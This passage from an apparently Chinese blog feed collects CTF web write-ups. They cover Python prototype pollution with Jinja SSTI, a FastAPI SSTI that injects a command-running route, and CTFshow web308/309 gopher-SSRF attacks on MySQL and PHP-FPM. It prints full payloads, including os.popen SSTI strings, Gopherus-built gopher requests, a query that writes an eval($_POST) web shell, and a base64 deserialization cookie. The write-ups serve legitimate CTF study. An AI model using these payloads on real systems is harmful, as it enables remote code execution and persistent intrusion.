[&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">@app.route(&#x27;/magic&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def pollute():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        if request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            return &quot;这个魔术还行吧&quot;</span><br><span class="line">        else:</span><br><span class="line">            return &quot;我要json的魔术&quot;</span><br><span class="line">    return &quot;记得用POST方法把魔术交上来&quot;</span><br></pre></td></tr></table></figure><p>1.根据代码可知，ssti注入禁用了{}，可能&#x2F;magic就是污染的地方，将上传的地方改为json再进行上传即可</p><p>我们只需要将全局变量BLACKLIST_IN_index的值进行修改，就可以使用ssti来进行模版注入了，脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"># 目标URL</span><br><span class="line">url = &quot;http://challenge.basectf.fun:42857/magic&quot;</span><br><span class="line"></span><br><span class="line"># 构造包含特殊键的 JSON 数据</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;__init__&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;BLACKLIST_IN_index&quot; : []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 将 JSON 数据转换为字符串</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span class="line">print(payload_json)</span><br><span class="line"></span><br><span class="line"># 发送 POST 请求</span><br><span class="line">response = requests.post(url, data=payload_json, headers=&#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;)</span><br><span class="line"></span><br><span class="line"># 打印响应内容</span><br><span class="line">print(&quot;Status Code:&quot;, response.status_code)</span><br><span class="line">print(&quot;Response Content:&quot;, response.text)</span><br></pre></td></tr></table></figure><p>2.最后就是在index中进行简单的ssti即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="巅峰极客-2024-GoldenHornKing"><a href="#巅峰极客-2024-GoldenHornKing" class="headerlink" title="[巅峰极客 2024]GoldenHornKing"></a>[巅峰极客 2024]GoldenHornKing</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@app.get(&quot;/calc&quot;)</span><br><span class="line">@timeout_after(1)</span><br><span class="line">async def ssti(calc_req: str):</span><br><span class="line">    global access</span><br><span class="line">    if (any(char.isdigit() for char in calc_req)) or (&quot;%&quot; in calc_req) or not calc_req.isascii() or access:</span><br><span class="line">        return &quot;bad char&quot;</span><br><span class="line">    else:</span><br><span class="line">        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(f&quot;&#123;&#123;&#123;&#123; &#123;calc_req&#125; &#125;&#125;&#125;&#125;&quot;).render(</span><br><span class="line">            &#123;&quot;app&quot;: app&#125;)</span><br><span class="line">        access = True</span><br><span class="line">        return result  # 返回计算结果</span><br><span class="line">    return &quot;fight&quot;</span><br></pre></td></tr></table></figure><p>尝试制作python内存马，在FastAPI中添加路由的方法有两种，一种是add_route()，在查看参数时发现没有response，第二种add_api_route()，发现存在参数中存在response，故选择add_api_route()方法通过lambda匿名函数返回期望的值，通过匿名函数参数实现控制执行的命令，这样不需要多次开启靶场环境。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc?calc_req=config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;app.add_api_route(&quot;/flag&quot;,lambda:__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read());&#x27;,&#123;&quot;app&quot;:app&#125;)</span><br></pre></td></tr></table></figure><p>访问.&#x2F;flag</p><h2 id="攻防世界-shrine"><a href="#攻防世界-shrine" class="headerlink" title="攻防世界_shrine"></a>攻防世界_shrine</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.进入题目以后发现了Python的flask代码</p><p>2.稍加整理，可以发现这是python中的<a href="https://so.csdn.net/so/search?q=flask%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">flask框架</a>，有可能存在ssti漏洞模块注入，代码中两次提到了路径”&#x2F;“与路径”&#x2F;shrine”,对于这两个路径尝试进行SSTI注入</p><p>3.在def safe_jinja(s):函数中有黑名单过滤掉了config与self字符，且将（）替换为空，但是代码定义了全局变量app.config,可以查看它的config。</p><p>4. 获得全局变量的config，构建的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>5.官网wp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;代码块&quot;&gt;&lt;a href=&quot;#代码块&quot; class=&quot;headerlink&quot; title=&quot;代码块&quot;&gt;&lt;/a&gt;代码块&lt;/h5&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Gopher协议打FastCGI（端口9000）</title>
    <link href="http://1768161086.github,io/2025/03/05/Gopher%E5%8D%8F%E8%AE%AE%E6%89%93FastCGI%EF%BC%88%E7%AB%AF%E5%8F%A39000%EF%BC%89/"/>
    <id>http://1768161086.github,io/2025/03/05/Gopher%E5%8D%8F%E8%AE%AE%E6%89%93FastCGI%EF%BC%88%E7%AB%AF%E5%8F%A39000%EF%BC%89/</id>
    <published>2025-03-05T07:48:11.000Z</published>
    <updated>2025-03-05T08:16:57.856Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="CTFshow-代码审计-web309"><a href="#CTFshow-代码审计-web309" class="headerlink" title="CTFshow 代码审计 web309"></a>CTFshow 代码审计 web309</h1></blockquote><p>1.题目描述：需要拿shell，308的方法不行了,mysql 有密码了。</p><p>2.手动扫描开放的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#一些危险的端口</span><br><span class="line">#21 ftp</span><br><span class="line">#22 ssh</span><br><span class="line">#80 http</span><br><span class="line">#443 https</span><br><span class="line">#3389 rdp windows远程桌面</span><br><span class="line">#1433 ms-sqlserver 默认端口</span><br><span class="line">#3306 mysql 默认端口</span><br><span class="line">#6379 redis 默认端口</span><br><span class="line">#9000 php-fpm(FastCGI) 默认端口</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line">     public $update_url = &#x27;gopher://127.0.0.1:【端口】&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuit抓包，端口设置成9000时候一直未响应。那就是9000端口存在服务.</p><p>3.FastCGI攻击需要满足四个条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件</span><br><span class="line">2、知道题目环境中的一个PHP文件的绝对路径</span><br><span class="line">3、PHP-FPM监听在本机9000端口</span><br><span class="line">4、libcurl版本&gt;=7.45.0</span><br></pre></td></tr></table></figure><p>4.Gopherus工具生成攻击FastCGI的payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure><p>之后有两个地方可以输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一个地方输入：</span><br><span class="line">一个已知存在的php文件如/var/www/html/index.php  </span><br><span class="line"></span><br><span class="line">第二个地方输入：</span><br><span class="line">希望目标服务器执行的恶意命令，比如反弹shell：</span><br><span class="line">tac f* 或</span><br></pre></td></tr></table></figure><p>5.输入后得到payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>6.6.访问index.php修改cookie得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;CTFshow-代码审计-web309&quot;&gt;&lt;a href=&quot;#CTFshow-代码审计-web309&quot; class=&quot;headerlink&quot; title=&quot;CTFshow 代码审计 web309&quot;&gt;&lt;/a&gt;CTFshow 代码审计 web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>gopher协议无密码注入mysql</title>
    <link href="http://1768161086.github,io/2025/03/05/ctfshow-web308/"/>
    <id>http://1768161086.github,io/2025/03/05/ctfshow-web308/</id>
    <published>2025-03-05T07:27:20.000Z</published>
    <updated>2025-03-06T13:12:22.339Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="CTFshow-代码审计-web308"><a href="#CTFshow-代码审计-web308" class="headerlink" title="CTFshow 代码审计 web308"></a>CTFshow 代码审计 web308</h1></blockquote><p>1.题目描述：需要拿shell</p><p>2.代码审计</p><p>3.<strong>SQL注入：</strong></p><p>无明显注入点，无SQL报错信息输出，insert语句都上了waf。SQL注入不可行。</p><p>4.<strong>反序列化写入文件：</strong></p><p>有无过滤的<code>file_put_contents()</code>函数却从未被调用。</p><p>5.<strong>反序列化执行命令：</strong> public function clearCache()</p><p>上了waf，只能输入大小写字母。</p><p>6.在<code>fun.php</code>的<code>checkUpdate()</code>函数中发现了明显的SSRF特征代码，而且没有过滤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>7.我们把所有有关的代码都整合起来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//【index.php】</span><br><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">    $lastVersion=$service-&gt;checkVersion();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【dao.php】</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line"></span><br><span class="line">    public function checkVersion()&#123;</span><br><span class="line">            return checkUpdate($this-&gt;config-&gt;update_url);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【config.php】</span><br><span class="line">class config&#123;</span><br><span class="line">    private $mysql_username=&#x27;root&#x27;;</span><br><span class="line">    //没有密码！！！！！</span><br><span class="line">    private $mysql_password=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    public $update_url = &#x27;https://vip.ctf.show/version.txt&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【fun.php】</span><br><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();    </span><br><span class="line">        //...</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得出我们可以使用SSRF打无密码的mysql。SSRF的payload由<code>/index.php</code>反序列化传入。</p><p>8.反序列化POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line">     public $update_url = &#x27;SSRF打无密码mysql的payload&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Gopherus工具对应文件夹开cmd控制台。工具下载地址<code>https://github.com/tarunkant/Gopherus</code></p><p>9.kali下载Gopherus工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus</span><br></pre></td></tr></table></figure><p>10.运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p>username:root</p><p>execute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;</span><br></pre></td></tr></table></figure><p>得到SSRFpayload：</p><p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</p><p>11.得到payload在index.php执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjM6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDEiO319</span><br></pre></td></tr></table></figure><p>12.访问1.php,post执行命令得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;CTFshow-代码审计-web308&quot;&gt;&lt;a href=&quot;#CTFshow-代码审计-web308&quot; class=&quot;headerlink&quot; title=&quot;CTFshow 代码审计 web308&quot;&gt;&lt;/a&gt;CTFshow 代码审计 web</summary>
      
    
    
    
    
  </entry>
  
</feed>
